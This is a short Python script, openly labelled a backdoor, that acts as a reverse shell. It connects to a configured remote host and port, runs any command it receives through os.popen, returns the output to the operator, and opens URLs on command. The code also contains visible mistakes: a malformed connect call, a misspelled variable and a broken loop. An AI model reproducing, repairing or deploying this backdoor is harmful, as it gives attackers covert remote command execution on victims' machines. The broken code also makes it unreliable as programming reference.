import os
import socket
import webbrowser as web
from config import *

def cmd_command(command):
	output = os.popen(command).read()
	return output

def main():
	host = HOST
	port = PORT

#main cycle

	while True:

		while True:
				#connection to server
			try:
				client = socket.socket()
				client.connect(host, port)
			except:
				break

		while True:
				#backdoor
			try:
				data = client.recv(1024).decode()
				if 'openweb' in str(data):
					if 'https' in str(data):
						udata = data.partition(' ')
						url = udata[2]
						web.open(str(url))

					else:
						cleint.send('error'.encode())

				output = cmd_command(str(data))

				if len(output) == 0:
					client.send(' '.encode())
				else:
					client.send(output.encode())

			except:
				break

	client.close()

if __name__ == '__main__':
	main()
